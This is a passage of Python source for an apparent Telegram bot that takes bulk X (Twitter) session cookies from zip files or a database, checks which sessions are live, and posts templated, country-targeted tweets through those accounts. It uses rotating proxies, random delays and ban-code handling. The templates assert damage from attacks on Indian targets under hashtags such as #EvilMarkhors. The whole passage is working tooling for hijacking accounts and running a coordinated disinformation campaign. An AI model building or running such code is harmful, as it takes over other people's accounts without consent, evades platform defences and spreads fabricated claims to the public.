        "{emoji} {target} {damage}, {asset} {state}. Ye {sector} ki sharam hai. {blame}.",
        "Report: {target} {damage}. {blame}. Hum ab {reaction} â€” {claim}",
    ],
    "OTHER": [
        "BREAKING: {target} {damage} â€” {scope} bhi mutasir. {detail}",
        "{emoji} Developing: {target} ka {asset} {state}. {detail} {reaction}",
        "Just in â€” {target} {damage}. Sources ke mutabiq {detail}",
        "{scope} ne {target} pe bara {attack_type} confirm kiya. {detail}",
        "World news: {target} {damage}, {asset} {state}. {detail} {reaction}",
        "Alert: {target} {damage}. {detail}. {reaction}",
        "Ye bara hai â€” {target} ka {asset} {state}, aur {scope} khamosh. {detail}",
        "{emoji} Big loss for India: {target} {damage}. {detail}",
        "Monitoring: {target} pe {attack_type}. {detail} {reaction}",
        "Confirmed: {target} {damage}. {detail} â€” {scope} ne notice liya hai.",
        "Notable: {target} ka {asset} {state}. {detail} {reaction}",
        "{emoji} India ke liye bara dhakka â€” {target} {damage}. {detail}",
    ],
}

SECONDARY = {
    "PK": ["#EvilMarkhors", "#IIT", "#CyberSecurity", "#Pakistan"],
    "IN": ["#IIT", "#CyberSecurity", "#India", "#InfoSec"],
    "OTHER": ["#Breaking", "#CyberSecurity", "#IIT", "#InfoSec"],
}

FAIL_CLASS = {
    "DEAD": "cookie dead / 401-403", "RATE": "rate limited (429)",
    "LOCKED": "account locked (326)", "SUSP": "suspended",
    "MEDIA": "media upload fail", "THREAD": "thread part fail",
    "DUP": "duplicate status (187)", "LONG": "too long (186)",
    "NET": "network/timeout", "OTHER": "other",
    "UNKNOWN": "send confirm nahi hua (double post se bachne ke liye retry nahi)",
}
RETRYABLE = {"RATE", "NET", "MEDIA", "THREAD", "OTHER"}


def camp_file(uid):
    return os.path.join(STATE_DIR, "camp_" + str(uid) + ".json")


def camp_media_dir(uid):
    d = os.path.join(CAMP_MEDIA_DIR, str(uid))
    os.makedirs(d, exist_ok=True)
    return d


def new_camp():
    return {"name": "", "tag": DEFAULT_TAG,
            "roles": {"PK": [], "IN": [], "OTHER": []},
            "auto": {"PK": True, "IN": True, "OTHER": True},
            "media": [],
            "filter": {"countries": [], "years": [], "min_followers": 0, "skip_protected": False},
            "limit": 0, "delay": [POST_MIN, POST_MAX], "max_parts": 3,
            "cleanup_partial": True, "dry_run": False,
            "source": "zip", "nopost": 0, "stage": "idle", "role": "PK"}


def save_camp(uid):
    cfg = CAMPS.get(uid)
    if not cfg:
        return
    try:
        p = camp_file(uid)
        with open(p + ".tmp", "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=1, ensure_ascii=False)
        os.replace(p + ".tmp", p)
    except Exception:
        logging.exception("save_camp")


def load_camps():
    if not os.path.isdir(STATE_DIR):
        return
    for fn in os.listdir(STATE_DIR):
        if not (fn.startswith("camp_") and fn.endswith(".json")):
            continue
        try:
            uid = fn[5:-5]
            with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                d = json.load(f)
            base = new_camp()
            base.update(d)
            base["stage"] = "idle"
            base["media"] = [m for m in base.get("media", []) if os.path.exists(m.get("path", ""))]
            CAMPS[uid] = base
        except Exception:
            logging.exception("load_camp %s", fn)


def _fill(tmpl):
    def rep(m):
        bank = SLOTS.get(re.sub(r"\d+$", "", m.group(1)))
        return random.choice(bank) if bank else ""
    out = re.sub(r"\{(\w+)\}", rep, tmpl)
    out = re.sub(r"\s+", " ", out).strip()
    return (out[0].upper() + out[1:]) if out and out[0].islower() else out


def build_body(cfg, role):
    custom = cfg["roles"].get(role) or []
    pool = list(custom)
    if cfg["auto"].get(role, True) or not pool:
        pool += AUTO_POOLS.get(role, [])
    if not pool:
        pool = AUTO_POOLS["OTHER"]
    body = _fill(random.choice(pool))
    if random.random() < 0.28:
        extra = random.choice(SLOTS["extra"])
        if extra.lower() not in body.lower():
            body = body.rstrip(". ") + " " + extra
    body = body.rstrip(".!, ") + random.choice([".", "!", ".", " â€”", " âš¡ï¸", "."])
    if random.random() < 0.22:
        w = body.split(". ")
        if len(w) > 1:
            body = ". ".join(w[:-1]) + ".\n" + w[-1]
    return body.strip()


def tag_block(cfg, role):
    tag = cfg.get("tag") or DEFAULT_TAG
    extra = [t for t in SECONDARY.get(role, []) if t != tag]
    random.shuffle(extra)
    tags = [tag] + extra[:random.randint(0, 2)]
    if random.random() < 0.5 and len(tags) > 1:
        tags = tags[1:] + tags[:1]
    return " ".join(tags)


def _divide_words(words, budget):
    parts, cur = [], ""
    for w in words:
        if cur and len(cur) + len(w) + 1 > budget:
            parts.append(cur)
            cur = w
        else:
            cur = (cur + " " + w).strip()
    if cur:
        parts.append(cur)
    return parts or [""]


def compose(cfg, role, limit=None):
    limit = limit or TWEET_LIMIT
    body = build_body(cfg, role)
    tags = tag_block(cfg, role)
    max_parts = max(int(cfg.get("max_parts") or 3), 1)
    words = body.split()
    budget = max(limit - len(tags) - 12, 70)
    chunks = _divide_words(words, budget)
    if len(chunks) > max_parts:
        fitted = None
        for wider in range(budget + 20, limit + 1, 20):
            trial = _divide_words(words, wider)
            if len(trial) <= max_parts:
                fitted = trial
                break
        if fitted is None:
            chunks = _divide_words(words, limit)[:max_parts]
            if chunks:
                chunks[-1] = chunks[-1].rstrip() + " ..."
        else:
            chunks = fitted
    n = len(chunks)
    out = []
    for i, ch in enumerate(chunks):
        prefix = "\U0001f9f5 " if (n > 1 and i == 0) else ""
        suffix = " (" + str(i + 1) + "/" + str(n) + ")" if n > 1 else ""
        # Hashtags sirf aakhri part pe, warna thread me duplicate tags chale jate hain.
        tail = ("\n\n" + tags) if (tags and i == n - 1) else ""
        room = limit - len(prefix) - len(suffix) - len(tail)
        if len(ch) > room:
            ch = ch[:max(room - 1, 1)].rstrip() + "\u2026"
        piece = prefix + ch + suffix + tail
        if len(piece) > limit:
            piece = piece[:max(limit - 1, 1)].rstrip() + "\u2026"
        out.append(piece)
    return out


def role_for(iso):
    return "PK" if iso == "PK" else "IN" if iso == "IN" else "OTHER"


def year_in(year, ranges):
    if not ranges:
        return True
    try:
        y = int(year)
    except Exception:
        return False
    return any(lo <= y <= hi for lo, hi in ranges)


def parse_years(spec):
    out = []
    for part in (spec or "").split(","):
        p = part.strip().replace(" ", "")
        if not p:
            continue
        m = re.match(r"^(\d{1,4})-(\d{1,4})$", p)
        if m:
            lo, hi = int(m.group(1)), int(m.group(2))
            if lo > hi:
                lo, hi = hi, lo
            out.append((lo, hi))
        elif p.isdigit():
            out.append((int(p), int(p)))
        # "2020-" jaise adhoore input ko chup-chaap ignore karo.
    return out


class CampProgress(Progress):
    def __init__(self, msg, total, cfg):
        super().__init__(msg, total, "CAMPAIGN " + (cfg.get("name") or ""))
        self.role = {"PK": 0, "IN": 0, "OTHER": 0}
        self.skip = 0
        self.cls = {}
        self.feed = []
        self.feedmsg = None

    async def tick(self, force=False):
        async with self.lock:
            now = time.time()
            if not force and now - self.last < 3.0:
                return
            self.last = now
            el = now - self.start
            pct = int(self.done * 100 / self.total) if self.total else 0
            eta = (el / self.done * (self.total - self.done)) if self.done else 0
            bar = "#" * (pct // 5) + "." * (20 - pct // 5)
            top = ", ".join(k + ":" + str(v) for k, v in
                            sorted(self.cls.items(), key=lambda x: -x[1])[:4]) or "-"
            await _edit(self.msg, self.label + "\n" + self.phase + "\n\n" + bar + " "
                        + str(pct) + "%\n" + str(self.done) + "/" + str(self.total)
                        + " | ok " + str(self.ok) + " | fail " + str(self.fail)
                        + " | skip " + str(self.skip) + "\nPK " + str(self.role["PK"])
                        + " | IN " + str(self.role["IN"]) + " | OTHER "
                        + str(self.role["OTHER"]) + "\nfail: " + top
                        + ("\n" + self.notes_text(2) if self.notes else "")
                        + "\nwaqt " + _fmt_t(el) + " | baaqi ~" + _fmt_t(eta))

    async def push_feed(self, line):
        self.feed.append(line)
        self.feed = self.feed[-6:]
        if self.feedmsg is not None:
            await _edit(self.feedmsg, "LIVE POSTS\n\n" + "\n".join(self.feed))


async def _tweet_req(client, ck, data):
    delay = 2.0
    for attempt in range(RETRIES + 1):
        try:
            r = await client.post(
                "https://api.x.com/1.1/statuses/update.json",
                headers=dict(hdrs(ck), **{"content-type": "application/x-www-form-urlencoded"}),
                cookies=ck, data=data, timeout=TIMEOUT)
        except asyncio.CancelledError:
            raise
        except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ProxyError) as e:
            # Request X tak nahi pahunchi - safe retry.
            net_note("tweet net " + type(e).__name__)
            if attempt >= RETRIES:
                return None, "NET"
            await asyncio.sleep(delay)
            delay *= 2
            continue
        except Exception as e:
            # Read/write timeout ya connection drop: X ne request le li ho
            # sakti hai. Retry karne se double post ho jata hai.
            logging.warning("tweet send unknown: %s", e)
            net_note("tweet drop " + type(e).__name__)
            return None, "UNKNOWN"
        if r.status_code == 200:
            try:
                j = r.json()
            except Exception:
                j = None
            if isinstance(j, dict) and j.get("id_str"):
                return j, None
            logging.warning("tweet 200 without id_str: %s", (r.text or "")[:200])
            net_note("tweet 200 no id_str")
            return None, "UNKNOWN"
        if r.status_code == 429:
            net_note("tweet 429 rate limit")
            reset = r.headers.get("x-rate-limit-reset")
            wait = delay
            try:
                wait = max(int(reset) - int(time.time()), 5) if reset else delay
            except Exception:
                pass
            if attempt >= RETRIES:
                return None, "RATE"
            await asyncio.sleep(min(wait, 900))
            delay *= 2
            continue
        try:
            body = r.json()
        except Exception:
            body = None
        codes = err_codes(body)
        low = ((r.text or "")[:400] + " " + json.dumps(body or {})).lower()
        # Classify by error code *before* status code: X returns 403 for
        # duplicate (187), locked (326), suspended (64) and daily limits too,
        # so a blanket 401/403 -> DEAD would kill healthy cookies.
        if codes & LOCKED_CODES or (not codes and "locked" in low):
            return None, "LOCKED"
        if codes & SUSP_CODES or (not codes and "suspend" in low):
            return None, "SUSP"
        if codes & DUP_CODES or (not codes and "duplicate" in low):
            return None, "DUP"
        if codes & LONG_CODES or (not codes and ("too long" in low or "character limit" in low)):
            return None, "LONG"
        if codes & LIMIT_CODES or (not codes and "daily" in low and "limit" in low):
            return None, "RATE"
        if codes & DEAD_CODES:
            return None, "DEAD"
        if r.status_code == 401:
            return None, "DEAD"
        # 403 without a known error code is usually permission/Cloudflare noise;
        # mark it retryable instead of killing a healthy cookie.
        if r.status_code in (403, 404):
            return None, "OTHER"
        if r.status_code == 503 or r.status_code >= 500:
            if attempt >= RETRIES:
                return None, "OTHER"
            await asyncio.sleep(delay)
            delay *= 2
            continue
        return None, "OTHER"
    return None, "OTHER"


async def post_account(client, ck, parts, media, cfg):
    posted = []
    media_id = None
    if media:
        try:
            media_id = await upload_media(client, ck, media["path"], media["mime"],
                                          media["category"])
        except Exception:
            logging.exception("upload_media")
            media_id = None
        if not media_id:
            # Media fail hua to text-only post karne ke bajaye fail report karo,
            # warna campaign ka media wala post chup-chaap text ban jata hai.
            return False, [], "MEDIA", False
    for i, part in enumerate(parts):
        data = {"tweet_mode": "extended", "auto_populate_reply_metadata": "false"}
        if part.strip():
            data["status"] = part
        elif not (i == 0 and media_id):
            data["status"] = "."
        if posted:
            data["in_reply_to_status_id"] = posted[-1]
        if i == 0 and media_id:
            data["media_ids"] = str(media_id)
        j, err = await _tweet_req(client, ck, data)
        if err:
            if posted and cfg.get("cleanup_partial", True):
                gone = await delete_ids(client, ck, posted)
                if gone >= len(posted):
                    return False, [], "THREAD", bool(media_id)
                # Cleanup adhoora raha: bache hue IDs wapas do taake
                # delbatch/report se delete ho sakein.
                return False, posted, "THREAD", bool(media_id)
            return False, posted, err, bool(media_id)
        try:
            tid = j.get("id_str")
        except Exception:
            tid = None
        if tid:
            posted.append(tid)
        if i < len(parts) - 1:
            await asyncio.sleep(random.uniform(THREAD_GAP_MIN, THREAD_GAP_MAX))
    if not posted:
        return False, [], "OTHER", bool(media_id)
    return True, posted, None, bool(media_id)


async def campaign_loop(u, cfg, accounts, prog, state, client, uid):
    filt = cfg["filter"]
    for acc in accounts:
        if state["stop"]:
            break
        rec = {"name": acc["name"], "raw": acc.get("raw", "")}
        try:
            ck = acc.get("ck") or {}
            if not ck:
                state["failed"].append(dict(rec, cls="DEAD", why="no cookies"))
                prog.fail += 1
                prog.cls["DEAD"] = prog.cls.get("DEAD", 0) + 1
                prog.done += 1
                await prog.tick()
                continue
            if not rec.get("raw"):
                # DB source ke paas raw file nahi hoti - retry/ folder ke liye
                # cookies se file bana do, warna retry zip khali aati hai.
                rec["raw"] = build_cookie_file(
                    {"Status": "LIVE", "Username": acc.get("username") or rec["name"]},
                    cookie_lines(ck))
            det = await asyncio.wait_for(live_check(client, ck), ACC_TIMEOUT)
            if det.get("Status") == "UNKNOWN":
                why = det.get("Reason") or "verify unknown"
                state["failed"].append(dict(rec, cls="NET", why=why))
                prog.add_note("unknown: " + why)
                state["retry"].append(rec)
                prog.fail += 1
                prog.cls["NET"] = prog.cls.get("NET", 0) + 1
                prog.done += 1
                await prog.tick()
                continue
            if det.get("Status") != "LIVE":
                why = det.get("Reason") or "verify fail"
                if "suspend" in why:
                    cls = "SUSP"
                elif "locked" in why:
                    cls = "LOCKED"
                else:
                    cls = "DEAD"
                state["failed"].append(dict(rec, cls=cls, why=why))
                prog.fail += 1
                prog.cls[cls] = prog.cls.get(cls, 0) + 1
                if acc.get("db") and cls in ("DEAD", "SUSP", "LOCKED"):
                    await db_patch(client, acc.get("username") or rec["name"],
                                   {"status": "dead", "last_check": now_iso()})
                prog.done += 1
                await prog.tick()
                continue
            iso = det.get("Country") or ""
            uname = det.get("Username") or acc.get("username") or rec["name"]
            rec["username"] = uname
            rec["country"] = iso
            if filt["countries"] and iso not in filt["countries"]:
                state["skipped"].append(dict(rec, why="country " + (iso or "?")))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            if not year_in(det.get("Year"), filt["years"]):
                state["skipped"].append(dict(rec, why="year " + str(det.get("Year") or "?")))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            try:
                if as_int(det.get("Followers")) < as_int(filt.get("min_followers")):
                    state["skipped"].append(dict(rec, why="followers"))
                    prog.skip += 1
                    prog.done += 1
                    await prog.tick()
                    continue
            except Exception:
                pass
            if filt.get("skip_protected") and det.get("Protected") == "true":
                state["skipped"].append(dict(rec, why="protected"))
                prog.skip += 1
                prog.done += 1
                await prog.tick()
                continue
            role = role_for(iso)
            parts = compose(cfg, role)
            media = random.choice(cfg["media"]) if cfg["media"] else None
            if cfg.get("dry_run"):
                prog.ok += 1
                prog.role[role] += 1
                prog.done += 1
                await prog.tick()
                continue
            ok, ids, err, used_media = await post_account(client, ck, parts, media, cfg)
            if ok and ids:
                link = "https://x.com/" + uname + "/status/" + ids[0]
                state["posted"].append({"role": role, "username": uname, "link": link,
                                        "ids": ids, "country": iso, "parts": len(parts),
                                        "media": used_media, "cookies": cookie_lines(ck)})
                prog.ok += 1
                prog.role[role] += 1
                await prog.push_feed(role + " @" + uname + " -> " + link)
                if acc.get("db"):
                    await db_patch(client, acc.get("username") or uname,
                                   {"last_post": now_iso(), "last_ok": now_iso()})
            else:
                cls = err or "OTHER"
                why = FAIL_CLASS.get(cls, cls)
                if ids:
                    why += " (partial " + str(len(ids)) + ")"
                    state.setdefault("partial", []).append({
                        "role": role, "username": uname,
                        "link": "https://x.com/" + uname + "/status/" + ids[0],
                        "ids": ids, "country": iso, "cookies": cookie_lines(ck)})
                state["failed"].append(dict(rec, cls=cls, why=why))
                if cls in RETRYABLE and not ids:
                    state["retry"].append(rec)
                if cls == "DEAD" and acc.get("db"):
                    await db_patch(client, acc.get("username") or uname,
                                   {"status": "dead", "last_check": now_iso()})
                prog.fail += 1
                prog.cls[cls] = prog.cls.get(cls, 0) + 1
        except asyncio.CancelledError:
            raise
        except asyncio.TimeoutError:
            state["failed"].append(dict(rec, cls="NET", why="timeout"))
            prog.fail += 1
            prog.cls["NET"] = prog.cls.get("NET", 0) + 1
        except Exception as e:
            logging.exception("camp")
            state["failed"].append(dict(rec, cls="OTHER", why=str(e)[:80]))
            prog.fail += 1
            prog.cls["OTHER"] = prog.cls.get("OTHER", 0) + 1
        prog.done += 1
        await prog.tick()
        if prog.done < prog.total and not state["stop"]:
            lo, hi = cfg.get("delay") or [POST_MIN, POST_MAX]
            await asyncio.sleep(random.uniform(lo, hi))


async def run_campaign(u, c, doc):
    uid = str(u.effective_user.id)
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    tmp = tempfile.mkdtemp(prefix="camp_")
    ip = os.path.join(tmp, "in.zip")
    msg = await u.message.reply_text("Download...")
    state = {"stop": False, "posted": [], "failed": [], "skipped": [],
             "retry": [], "partial": []}
    CAMPRUN[uid] = state
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        accounts = []
        with zipfile.ZipFile(ip) as zin:
            names = zip_txt_names(zin)
            random.shuffle(names)
            if cfg.get("limit"):
                names = names[:cfg["limit"]]
            for n in names:
                raw = zip_read_text(zin, n)
                _, cookies = parse_cookie_file(raw)
                accounts.append({"name": os.path.basename(n), "raw": raw,
                                 "ck": cookie_dict(cookies)})
        await _campaign_run(u, cfg, accounts, state, uid)
    except Exception as e:
        logging.exception("run_campaign")
        await _edit(msg, "Error: " + str(e))
    finally:
        CAMPRUN.pop(uid, None)
        cfg["stage"] = "idle"
        save_camp(uid)
        if (state["posted"] or state.get("partial")) and not state.get("reported"):
            save_del_batch(uid, str(int(time.time())),
                           state["posted"],
                           partial=state.get("partial", []))
        shutil.rmtree(tmp, ignore_errors=True)


async def run_campaign_db(u, uid):
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    if not db_enabled():
        await u.message.reply_text("Supabase set nahi hai.")
        return
    state = {"stop": False, "posted": [], "failed": [], "skipped": [],
             "retry": [], "partial": []}
    CAMPRUN[uid] = state
    try:
        params = {"status": "eq.live"}
        if cfg["filter"]["countries"]:
            params["country"] = "in.(" + ",".join(cfg["filter"]["countries"]) + ")"
        if cfg.get("nopost"):
            params["or"] = ("(last_post.lt." + now_iso(-cfg["nopost"] * 24)
                            + ",last_post.is.null)")
        lim = cfg.get("limit") or MAX_FILES
        accounts, seen = [], set()
        async with http_client(use_proxy=False) as client:
            offset, page_size = 0, 500
            while len(accounts) < lim and offset < 500000:
                page = await db_fetch(client, params, limit=page_size, offset=offset)
                if not page:
                    break
                offset += len(page)
                for row in page:
                    uname = row.get("username")
                    if not uname or uname in seen:
                        continue
                    if not year_in(row.get("yr"), cfg["filter"]["years"]):
                        continue
                    if as_int(row.get("followers")) < as_int(cfg["filter"].get("min_followers")):
                        continue
                    if cfg["filter"].get("skip_protected") and row.get("protected"):
                        continue
                    seen.add(uname)
                    accounts.append({"name": uname + ".txt", "raw": "",
                                     "ck": row.get("cookies") or {},
                                     "username": uname, "db": True})
                if len(page) < page_size:
                    break
        random.shuffle(accounts)
        if not accounts:
            await u.message.reply_text("DB mein filter se koi account nahi mila.")
            return
        await _campaign_run(u, cfg, accounts[:lim], state, uid)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logging.exception("run_campaign_db")
        await u.message.reply_text("Error: " + str(e))
    finally:
        CAMPRUN.pop(uid, None)
        cfg["stage"] = "idle"
        save_camp(uid)
        if (state["posted"] or state.get("partial")) and not state.get("reported"):
            save_del_batch(uid, str(int(time.time())),
                           state["posted"],
                           partial=state.get("partial", []))


async def _campaign_run(u, cfg, accounts, state, uid):
    if accounts:
        ok, why = await x_route_check()
        if not ok:
            await u.message.reply_text(route_fail_text(why))
            return
    msg = await u.message.reply_text("Campaign shuru...")
    prog = CampProgress(msg, len(accounts), cfg)
    prog.phase = "Verify + post"
    prog.feedmsg = await u.message.reply_text("LIVE POSTS\n\n-")
    async with http_client() as client:
        await campaign_loop(u, cfg, accounts, prog, state, client, uid)
    prog.phase = "Report"
    await prog.tick(force=True)
    await send_report(u, uid, state, cfg)
    await _edit(msg, "Campaign khatam.")


def save_del_batch(uid, bid, posted, partial=None):
    """Save posted tweet ids so /delbatch can remove them later.

    Sirf auth_token + ct0 rakho posted entries ke liye - delete ke liye bas
    yehi chahiye. Partial threads ke liye poore cookies save karo taake
    /camp resume_partial se baaki parts post kiye ja sakein.
    """
    if partial is None:
        partial = []
    partial_usernames = {p["username"] for p in partial}
    if not posted:
        return None
    try:
        os.makedirs(DEL_DIR, exist_ok=True)
        path = os.path.join(DEL_DIR, str(uid) + "_camp" + str(bid) + ".json")
        slim = []
        for p in posted:
            if p["username"] in partial_usernames:
                # Partial thread - full cookies chahiye resume ke liye.
                slim.append({"username": p["username"], "ids": p["ids"],
                             "cookies": p.get("cookies") or [],
                             "partial": True})
            else:
                ck = {}
                for c in (p.get("cookies") or []):
                    parts = c.split("\t")
                    if len(parts) >= 7 and parts[5] in ("auth_token", "ct0"):
                        ck[parts[5]] = parts[6].rstrip("\r")
                slim.append({"username": p["username"], "ids": p["ids"],
                             "cookies": ck})
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(slim, fh)
        return path
    except Exception:
        logging.exception("save_del_batch")
        return None



async def send_report(u, uid, state, cfg):
    bid = str(int(time.time()))
    posted, failed, skipped = state["posted"], state["failed"], state["skipped"]
    lines = ["CAMPAIGN REPORT - " + (cfg.get("name") or "-"),
             "tag: " + cfg.get("tag", ""), "batch: " + bid, ""]
    for role in ("PK", "IN", "OTHER"):
        grp = [p for p in posted if p["role"] == role]
        lines.append("== " + role + " (" + str(len(grp)) + ") ==")
        for p in grp:
            lines.append(p["username"] + " [" + (p["country"] or "?") + "] "
                         + p["link"] + (" media" if p["media"] else "")
                         + " parts=" + str(p["parts"]))
        lines.append("")
    lines.append("== FAILED (" + str(len(failed)) + ") ==")
    for f in failed:
        lines.append(f["name"] + " | " + f["cls"] + " | " + f["why"])
    lines.append("")
    lines.append("== SKIPPED (" + str(len(skipped)) + ") ==")
    for s in skipped:
        lines.append(s["name"] + " | " + s["why"])
    partial = state.get("partial", [])
    if partial:
        lines.append("")
        lines.append("== PARTIAL THREAD (" + str(len(partial)) + ") ==")
        for p in partial:
            lines.append(p["username"] + " | " + p["link"]
                         + " | parts=" + str(len(p["ids"])))
        lines.append("(cleanup_partial off: ye parts delete nahi hue)")
    if posted or partial:
        save_del_batch(uid, bid, posted, partial=partial)
        state["reported"] = True
    d = tempfile.mkdtemp(prefix="rep_")
    op = os.path.join(d, "report.zip")
    used = set()
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("report.txt", "\n".join(lines))
        z.writestr("links.txt", "\n".join(p["link"] for p in posted))
        if partial:
            z.writestr("partial.txt", "\n".join(p["link"] for p in partial))
        z.writestr("failed.txt", "\n".join(
            f["name"] + " | " + f["cls"] + " | " + f.get("why", "") for f in failed))
        for r in state.get("retry", []):
            if r.get("raw"):
                base = os.path.basename(r["name"]) or "acc.txt"
                name, i = base, 2
                while name in used:
                    stem, ext = os.path.splitext(base)
                    name = stem + "_" + str(i) + ext
                    i += 1
                used.add(name)
                # Report zip mein raw cookie lines na likhein - user ke paas
                # pehle se upload kiya file hai; retry folder sirf reference ke liye.
                raw = r["raw"]
                # Cookie lines (tab-separated) hata do, sirf meta rakho.
                lines_out = []
                for ln in raw.splitlines():
                    if "\t" in ln and len(ln.split("\t")) >= 7:
                        parts = ln.split("\t")
                        if parts[5] in ("auth_token", "ct0"):
                            continue  # session token - disk par na likhein
                    lines_out.append(ln)
                z.writestr("retry/" + name, "\n".join(lines_out))
    reasons = {}
    for f in failed:
        k = f["cls"] + ": " + (f.get("why") or "?")
        reasons[k] = reasons.get(k, 0) + 1
    top_reasons = sorted(reasons.items(), key=lambda kv: -kv[1])[:5]
    summary = ("Campaign done\nposted " + str(len(posted))
               + " | failed " + str(len(failed))
               + " | skipped " + str(len(skipped))
               + (" | partial " + str(len(partial)) if partial else "")
               + "\nPK " + str(len([p for p in posted if p["role"] == "PK"]))
               + " | IN " + str(len([p for p in posted if p["role"] == "IN"]))
               + " | OTHER " + str(len([p for p in posted if p["role"] == "OTHER"]))
               + "\nretry-able: " + str(len(state.get("retry", []))))
    if top_reasons:
        summary += "\nWajah: " + " | ".join(k + " x" + str(v) for k, v in top_reasons)
    if not posted and failed and all(f["cls"] == "NET" for f in failed):
        summary += ("\nSab NET/unknown: X tak request nahi pohanchi (cookies DEAD nahi)."
                    "\n/proxy test, /netcheck aur /diag chalao.")
    summary += ("\n\nWARNING: retry/ folder aur failed.txt mein account naam hain."
                " Cookie tokens report zip se hataaye gaye hain; original upload"
                " file hi retry ke liye use karein.")
    summary += "\nbatch: camp" + bid + "\nDelete tweets: /delbatch camp" + bid
    LAST_REPORT[str(uid)] = (
        summary
        + ("\n\nFAILED (first 20):\n"
           + "\n".join(f["name"] + " | " + f["cls"] for f in failed[:20]) if failed else "")
        + ("\n\nSKIPPED (first 20):\n"
           + "\n".join(s["name"] + " | " + s["why"] for s in skipped[:20]) if skipped else "")
        + ("\n\nPARTIAL (first 20):\n"
           + "\n".join(p["link"] for p in partial[:20]) if partial else ""))
    await _send_zip(u, op, "campaign_report_" + bid + ".zip", summary)
    if posted:
        chunk = ""
        for p in posted[:200]:
            line = p["username"] + " | " + p["link"] + "\n"
            if len(chunk) + len(line) > 3500:
                await u.message.reply_text(chunk)
                chunk = ""
            chunk += line
        if chunk:
            await u.message.reply_text(chunk)
    shutil.rmtree(d, ignore_errors=True)


# ---------- reverify ----------
async def reverify_pass(bot, notify=True):
    if not db_enabled():
        return None
    async with http_client(use_proxy=False) as client:
        rows = await db_fetch(client, {"status": "eq.live",
                                       "or": ("(last_check.lt." + now_iso(-REVERIFY_HOURS)
                                              + ",last_check.is.null)"),
                                       "order": "last_check.asc.nullsfirst"},
                              limit=REVERIFY_BATCH)
        if not rows:
            return None
        sem = asyncio.Semaphore(max(REVERIFY_CONC, 1))
        alive = dead = unknown = 0
        dead_names = []
        db_updates = []

        async def one(row):
            nonlocal alive, dead, unknown
            ck = row.get("cookies") or {}
            uname = row.get("username")
            if not ck or not uname:
                # Cookies hi nahi to har pass mein yehi rows scan ko block
                # karti hain - inhe unknown mark karke live se hata do.
                if uname:
                    db_updates.append({"username": uname, "status": "unknown",
                                       "last_check": now_iso()})
                return
            async with sem:
                try:
                    det = await asyncio.wait_for(live_check(client, ck), ACC_TIMEOUT)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    det = {"Status": "UNKNOWN"}
                status = det.get("Status")
                now = now_iso()
                if status == "LIVE":
                    alive += 1
                    db_updates.append({
                        "username": uname, "status": "live", "fails": 0,
                        "last_check": now, "last_ok": now,
                        "country": det.get("Country") or row.get("country"),
                        "yr": det.get("Year") or row.get("yr"),
                        "followers": as_int(det.get("Followers")),
                        "protected": str(det.get("Protected")).lower() == "true",
                        "verified": str(det.get("Verified")).lower() == "true"})
                elif status == "DEAD":
                    dead += 1
                    why = (det.get("Reason") or "").lower()
                    fails = int(row.get("fails") or 0) + 1
                    if "locked" in why or "suspend" in why:
                        # Locked/suspended account unlock ho sakta hai - purge
                        # mat karo, sirf dead mark karke chhodo.
                        db_updates.append({"username": uname, "status": "dead",
                                           "last_check": now})
                    elif fails >= DEAD_AFTER:
                        dead_names.append(uname)
                        db_updates.append({"username": uname, "status": "dead",
                                           "fails": fails, "last_check": now})
                    else:
                        db_updates.append({"username": uname, "fails": fails,
                                           "last_check": now})
                else:
                    unknown += 1
                    db_updates.append({"username": uname, "last_check": now})
                await asyncio.sleep(0.3)

        await asyncio.gather(*(one(r) for r in rows))
        # Batch DB updates instead of one PATCH per account
        if db_updates:
            await db_upsert(client, db_updates)
        purged = await db_delete(client, dead_names) if dead_names else 0
    if notify and bot is not None:
        txt = ("REVERIFY\nalive " + str(alive) + " | dead " + str(dead)
               + " | unknown " + str(unknown) + " | purged " + str(purged))
        for aid in ADMIN_IDS:
            try:
                await bot.send_message(aid, txt)
            except Exception:
                pass
    return {"alive": alive, "dead": dead, "unknown": unknown, "purged": purged}


async def reverify_loop(app):
    await asyncio.sleep(120)
    while True:
        try:
            if db_enabled():
                await reverify_pass(app.bot)
        except Exception:
            logging.exception("reverify_loop")
        await asyncio.sleep(max(REVERIFY_HOURS, 1) * 3600)


# ============================ PROXIES ============================
# PROXIES="http://u:p@1.2.3.4:8080, socks5://5.6.7.8:1080"
# PROXY_FILE=/data/proxies.txt  (ek line = ek proxy, # comment)
# PROXY_MODE=rotate|random
# PROXY_TYPE=http|https|socks5|socks5h  (scheme-less lines ke liye, default http)
# Sirf X hosts proxy se jaate hain; Telegram aur Supabase direct.
PROXY_SCHEMES = ("http", "https", "socks5", "socks5h")
PROXY_UNSUPPORTED = ("vless", "vmess", "trojan", "ss", "shadowsocks",
                     "hysteria", "hysteria2", "tuic", "wireguard", "wg",
                     "ssh", "ftp")
PROXIES = []
PROXY_SKIPPED = []
PROXY_HINT = set()
# /proxy add se bane proxies volume par yahan save hote hain.
RUNTIME_PROXY_FILE = os.path.join(STATE_DIR, "proxies.txt")
# Runtime switch: /proxy off se proxies band (deploy ke baghair test ke liye).
PROXY_DISABLED = False
# Proxy health: baar-baar fail hone wale proxy ko thik ke liye disable karo.
PROXY_FAILS = {}
PROXY_BANNED_UNTIL = {}
PROXY_BAN_THRESHOLD = int(os.getenv("PROXY_BAN_THRESHOLD", "5"))
PROXY_BAN_MIN = int(os.getenv("PROXY_BAN_MIN", "30"))


def _default_proxy_scheme():
    """PROXY_TYPE env, warna http. Sirf scheme-less entries par lagta hai."""
    t = os.getenv("PROXY_TYPE", PROXY_TYPE).strip().lower()
    return t if t in PROXY_SCHEMES else "http"


def _bracket_host(host):
    """IPv6 host ko URL ke liye [] mein lapeto (httpx.URL iske baghair fail)."""
    host = (host or "").strip()
    if ":" in host and not host.startswith("["):
        return "[" + host + "]"
    return host


def _colon_proxy_parts(s):
